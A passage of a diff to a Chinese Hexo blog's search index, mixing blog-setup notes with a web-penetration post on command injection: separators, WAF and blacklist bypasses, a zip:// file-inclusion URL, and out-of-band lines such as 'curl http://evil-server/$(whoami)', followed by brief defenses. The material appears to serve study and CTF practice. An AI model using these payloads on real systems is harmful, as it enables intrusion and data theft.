+<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
 
-<p>第二步：在根目录下的 <strong>source</strong> 文件中新建 <strong>CNAME</strong> 文件，文件中写入你的域名(购买的)，不要加上www。</p>
-<p>第三步：重新部署一下</p>
-<p>在 <strong>Github</strong> 查看 <strong>CNAME</strong> 文件以及网址。</p>
-<p>输入域名就可以直接登录网站了。</p>
-<h1 id="博客配置"><a href="#博客配置" class="headerlink" title="博客配置"></a>博客配置</h1><h2 id="Hexo-博客生成永久链接"><a href="#Hexo-博客生成永久链接" class="headerlink" title="Hexo 博客生成永久链接"></a>Hexo 博客生成永久链接</h2><p>Hexo 文章链接默认的生成规则是：<code>:year/:month/:day/:title</code>，是按照年、月、日、标题来生成的。</p>
-<p>修改链接有助于别人记录，方便自己随时修改文章的内容，只要不改变 footer-matter 中的 id 值，那么文章链接永远不会变。</p>
-<p><strong>安装插件</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure>
+<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
 
-<p><strong>修改配置文件</strong></p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## permalink: :year/:month/:day/:title/</span></span><br><span class="line"><span class="comment">## 此处可以自己设置</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink/</span> </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink.html</span></span><br></pre></td></tr></table></figure>
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
 
-<p>在文件中增加配置</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># abbrlink config</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">  <span class="attr">alg:</span> <span class="string">crc32</span>      <span class="comment">#support crc16(default) and crc32</span></span><br><span class="line">  <span class="attr">rep:</span> <span class="string">hex</span>        <span class="comment">#support dec(default) and hex</span></span><br><span class="line">  <span class="attr">drafts:</span> <span class="literal">false</span>   <span class="comment">#(true)处理草稿,(false)不处理草稿. false(default) </span></span><br><span class="line">  <span class="comment"># 从目录树生成类别</span></span><br><span class="line">  <span class="comment"># depth: 要生成的目录树的最大深度，应该&gt; 0</span></span><br><span class="line">  <span class="attr">auto_category:</span></span><br><span class="line">     <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment">#true(default)</span></span><br><span class="line">     <span class="attr">depth:</span>        <span class="comment">#3(default)</span></span><br><span class="line">     <span class="attr">over_write:</span> <span class="literal">false</span> </span><br><span class="line">  <span class="attr">auto_title:</span> <span class="literal">false</span> <span class="comment">#启用自动标题，它可以根据路径自动填充标题</span></span><br><span class="line">  <span class="attr">auto_date:</span> <span class="literal">false</span> <span class="comment">#启用自动日期，它可以根据今天的时间自动填充日期</span></span><br><span class="line">  <span class="attr">force:</span> <span class="literal">false</span> <span class="comment">#启用强制模式，在这种模式下，插件将忽略缓存，并为每个帖子计算缩写链接，即使它已经有缩写链接。 这只会更新 abbrlink 而不是其他前面的变量。</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>样式</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crc16 &amp; hex</span><br><span class="line">https://post.zz173.com/posts/66c8.html</span><br><span class="line"></span><br><span class="line">crc16 &amp; dec</span><br><span class="line">https://post.zz173.com/posts/65535.html</span><br><span class="line">#32</span><br><span class="line">crc32 &amp; hex</span><br><span class="line">https://post.zz173.com/posts/8ddf18fb.html</span><br><span class="line"></span><br><span class="line">crc32 &amp; dec</span><br><span class="line">https://post.zz173.com/posts/1690090958.html</span><br></pre></td></tr></table></figure>
-
-
-
-<blockquote>
-<p>github地址：<a href="https://github.com/Rozbo/hexo-abbrlink">hexo-abbrlink</a></p>
-</blockquote>
-<h2 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h2><p>主题配置文件，关键字：<strong>menu</strong>，删除前面的注释就可以启用</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="comment">#about: /about/ || fa fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">/resources/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-download</span>   <span class="comment">#资源</span></span><br><span class="line">  <span class="attr">tools:</span> <span class="string">/tools/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-briefcase</span></span><br><span class="line">  <span class="comment">#schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line">  <span class="comment">#sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line">  <span class="comment">#commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable / Disable menu icons / item badges.</span></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">badges:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>“||”前面是目标链接，后面是图标名称，主题使用图标来自<a href="http://www.fontawesome.com.cn/faicons/#web-application">图标库 - Font Awesome 中文网</a>，可以自己搜索图标使用</p>
-<p>新添加的菜单需要翻译对应的中文，打开theme/next/languages/zh-CN.yml，在menu下设置：</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">首页</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">归档</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">标签</span></span><br><span class="line">  <span class="attr">about:</span> <span class="string">关于</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">资源</span></span><br><span class="line">  <span class="attr">search:</span> <span class="string">搜索</span></span><br></pre></td></tr></table></figure>
-
-<p>在根目录下，执行如下命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;resources&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>在根目录sources文件夹下会生成categories、tags、about、resources四个文件，每个文件中有一个<code>index.md</code>文件，修改内容分别如下：</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">#例子</span></span><br><span class="line">title: 标签</span><br><span class="line">date: 2019-06-29 11:35:42   # 时间随意</span><br><span class="line">type: &quot;tags&quot;                # 类型一定要为tags</span><br><span class="line">comments: false             # 提示这个页面不需要加载评论</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="主题配置优化"><a href="#主题配置优化" class="headerlink" title="主题配置优化"></a>主题配置优化</h1><p>我选butterfly的主题，所以主题是针对这个主题的，不一定适用其他主题</p>
-<h2 id="butterfly主题文章双栏布局插件"><a href="#butterfly主题文章双栏布局插件" class="headerlink" title="butterfly主题文章双栏布局插件"></a>butterfly主题文章双栏布局插件</h2><p><strong>NPM 插件安装的部署方法：</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i hexo-butterfly-article-double-row --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"></span><br><span class="line">cnpm i hexo-butterfly-article-double-row --save</span><br></pre></td></tr></table></figure>
-
-<p>注意，一定要加<code>--save</code>，不然本地预览的时候可能不会显示！！！</p>
-<p><strong>新增配置</strong></p>
-<p>是网站根目录下的配置文件_config</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">butterfly_article_double_row:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>然后素质三连。</p>
-<h2 id="Butterfly添加顶部加载进度条"><a href="#Butterfly添加顶部加载进度条" class="headerlink" title="Butterfly添加顶部加载进度条"></a>Butterfly添加顶部加载进度条</h2><p>我使用的是4.7.0版本，版本已经集成了，在配置文件中直接修改就好。</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">preloader:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source</span></span><br><span class="line">  <span class="comment"># 1. fullpage-loading</span></span><br><span class="line">  <span class="comment"># 2. pace (progress bar)</span></span><br><span class="line">  <span class="attr">source:</span> <span class="number">2</span></span><br><span class="line">  <span class="comment"># pace theme (see https://codebyzach.github.io/pace/)</span></span><br><span class="line">  <span class="attr">pace_css_url:</span> <span class="string">https://fastly.jsdelivr.net/gh/xlenco/JS-X@main/pace.js/pace.css</span></span><br></pre></td></tr></table></figure>
-
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 #&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>Hexo</category>
+        <category>web渗透</category>
       </categories>
       <tags>
-        <tag>博客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>win10报错</title>
-    <url>/posts/9ffa43eb.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在使用计算机时，因为我们自己的骚操作会产生一些奇奇怪怪的报错。因此特此积累一下自己所遇到的报错。也方便自己下次可以自己解决，也方便他人解决。</p>
-<h1 id="各种报错"><a href="#各种报错" class="headerlink" title="各种报错"></a>各种报错</h1><h2 id="Windows-PowerShell"><a href="#Windows-PowerShell" class="headerlink" title="Windows PowerShell"></a>Windows PowerShell</h2><h3 id="显示找不到快捷文件"><a href="#显示找不到快捷文件" class="headerlink" title="显示找不到快捷文件"></a>显示找不到快捷文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将C盘用户里面Default”这个用户（win10系统的默认账号）的Windows PowerShell复制到你的用下相同的目录下即可。</span><br><span class="line"></span><br><span class="line">目录</span><br><span class="line">C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>win系统</category>
-      </categories>
-      <tags>
-        <tag>win10</tag>
+        <tag>漏洞利用</tag>
       </tags>
   </entry>
   <entry>
@@ -1517,51 +1746,6 @@
 <p>注意：在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 <strong>#</strong> 在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
 <p><strong>Exp：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/index.php?filename=zip://shell.png%23shell.php</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>漏洞利用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>命令执行漏洞</title>
-    <url>/posts/a43e8dc0.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>漏洞源因</strong></p>
-<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
-<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>即web服务页面中可以执行系统性命令或函数，导致系统的信息泄露。</p>
-<h2 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">shell_exec() = ``</span><br><span class="line">popen()</span><br><span class="line">peoc()</span><br><span class="line">proc_opne()</span><br><span class="line">pcntl_exec()</span><br></pre></td></tr></table></figure>
-
-<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">popen()</span><br><span class="line">subprocess.call()</span><br><span class="line">spawn()</span><br></pre></td></tr></table></figure>
-
-<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.lang.Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure>
-
-<h1 id="常见注入方式"><a href="#常见注入方式" class="headerlink" title="常见注入方式"></a>常见注入方式</h1><p>windows</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|| &amp;&amp; &amp; 分隔</span><br><span class="line">\r\n %d0%d0 换行</span><br><span class="line">反引号解析</span><br><span class="line">$() 替换</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
-<p>Linux下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分号分隔</span><br><span class="line">;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">|  直接执行后面的语句</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;  前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
-<h1 id="无回显注入"><a href="#无回显注入" class="headerlink" title="无回显注入"></a>无回显注入</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash反弹shell</span><br><span class="line">DNS外带数据</span><br><span class="line">http带外：</span><br><span class="line">          curl http://evil-server/$(whoami)</span><br><span class="line">          wget http://evil-server/$(whoami)</span><br><span class="line">无带外时利用sleep或其他逻辑构成bool条件</span><br></pre></td></tr></table></figure>
-
-<h1 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h1><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; &gt; &lt;&gt;符号 cat&lt;123</span><br><span class="line">\t</span><br><span class="line">$&#123;IFS&#125;其中&#123;&#125;用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell系统进程的第九个参的持有者，它始终为空字符串。</span><br><span class="line">$IFS$9</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.php&#125; //逗号实现空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
-
-<p>liunx绕开空格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat%09flag</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">ca\t fl\ag</span><br></pre></td></tr></table></figure>
-
-<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=l;b=s;$s$b //拼接</span><br><span class="line">当cat flag被过滤时：</span><br><span class="line">a=c;b=at;c=f;d=lag;$a$b $&#123;c&#125;$&#123;d&#125;</span><br><span class="line"></span><br><span class="line">base64 echo &quot;bHM&quot;= | base64 -d //base64编码</span><br><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash (在bash被过滤的情况下可尝试sh)</span><br><span class="line"></span><br><span class="line">/?in/?s &gt; /bin/ls</span><br><span class="line">未定义的初始化变量 cat$4 /etc/passwd</span><br><span class="line"></span><br><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag //单双引号</span><br><span class="line"></span><br><span class="line">c\at fl\ag //反斜线</span><br><span class="line"></span><br><span class="line">正则 (假设/bin/cat: test: 是一个目录)</span><br><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line">/???/?at ????</span><br><span class="line">/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0 是脚本本身的名字</span><br><span class="line">$1 是传递给该shell脚本的第一个参数</span><br><span class="line">$2 是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
-
-<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;wget\</span><br><span class="line">&gt;foo.\</span><br><span class="line">&gt;com</span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
-
-<p>上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行 直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看) 如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向 而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件</p>
-<h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容  </span><br><span class="line">less:与 more 类似  </span><br><span class="line">head:查看头几行  </span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示  </span><br><span class="line">tail:查看尾几行  </span><br><span class="line">nl：显示的时候，顺便输出行号  </span><br><span class="line">od:以二进制的方式读取档案内容  </span><br><span class="line">vi:一种编辑器，这个也可以查看  </span><br><span class="line">vim:一种编辑器，这个也可以查看  </span><br><span class="line">sort:可以查看  </span><br><span class="line">uniq:可以查看  </span><br><span class="line">file -f:报错出具体内容  </span><br><span class="line">grep  </span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：  </span><br><span class="line">grep test *file  </span><br><span class="line">strings</span><br></pre></td></tr></table></figure>
-
-<h1 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h1><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a 换行符，需要php环境</span><br><span class="line">%0d 回车符，需要php环境</span><br><span class="line">\n </span><br><span class="line">\r</span><br><span class="line">; 在 shell 中，是”连续指令”，这个与下面的`|`作用类似</span><br><span class="line">| （就是按位或），直接执行|后面的语句</span><br><span class="line">|| （就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; （就是按位与），&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; （就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
-
-<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 0到无穷个任意字符</span><br><span class="line">? 一个任意字符</span><br><span class="line">[ ] 一个在括号内的字符，e.g. [abcd]</span><br><span class="line">[ - ] 在编码顺序内的所有字符</span><br><span class="line">[^ ] 一个不在括号内的字符</span><br></pre></td></tr></table></figure>
-
-<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不使用时禁用相应函数</span><br><span class="line">尽量不要执行外部的应用程序或命令</span><br><span class="line">做输入的格式检查</span><br><span class="line">转义命令中的所有shell元字符</span><br><span class="line">                shell元字符包括 #&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>web渗透</category>
